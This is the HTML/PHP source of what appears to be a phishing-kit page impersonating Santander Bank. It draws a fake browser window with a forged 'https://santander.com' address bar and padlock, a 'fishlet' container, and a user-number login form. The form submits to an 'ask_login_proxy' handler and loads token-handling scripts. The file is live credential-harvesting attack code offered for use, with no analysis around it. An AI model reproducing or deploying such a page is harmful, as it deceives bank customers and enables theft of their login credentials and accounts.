<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="form/core_form.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<body>
  <div id="background">
    <img src="santander.png" width="100%" height="100%" />
  </div>
  <div id="main"></div>
  <div id="window">
    <!-- Title bar start -->
    <div id="title-bar-width">
      <div id="title-bar">
        <div>
          <img src="./Santander-Logo.png" height="40px" id="logo">
          <span id="logo-description">LOGIN SECURELY TO SANTANDER BANK</span>
        </div>

        <div>
          <span id="minimize">&#8212;</span>
          <span id="square">□</span>
          <span id="exit">✕</span>
        </div>
      </div>
      <div id="url-bar">
        <img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
        <span id="domain-name">https://santander.com</span>
        <span
          id="domain-path">/login/auth=jks83NJBnsHga8202BCb2nk18JKnsbshacaHGC278y2bq2089SMkAJBbskbB11n45snsHwu2nLma82Las</span>
      </div>
    </div>
    <!-- Content start -->
    <div id="fishlet">
      <input id="input1" placeholder="insert data">
    </div>
    </form>
  </div>
  <form novalidate onsubmit="send1(event,'ask_login_proxy');return false">
    <div class="number">
      <span class="icon numbericon hasBgImage"></span><input id="user" placeholder="Verfügernummer/Benutzer"
        pattern=".{4,}" name="user" class="input" autocomplete="off" type="text" maxlength="80" value="">
      <script data-savepage-type="text/javascript" type="text/plain"></script>
    </div>



    <div class="submit">


      <input id="submitButton" type="submit" class="submit" value="Login starten">



    </div>

    <!-- <iframe id="content"
				src="http://santander.com/"
				frameBorder="0"></iframe> -->
    </div>
    <div class="isSmallScreen" id="isSmallScreen"></div>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="./script.js"></script>

</body>

</html>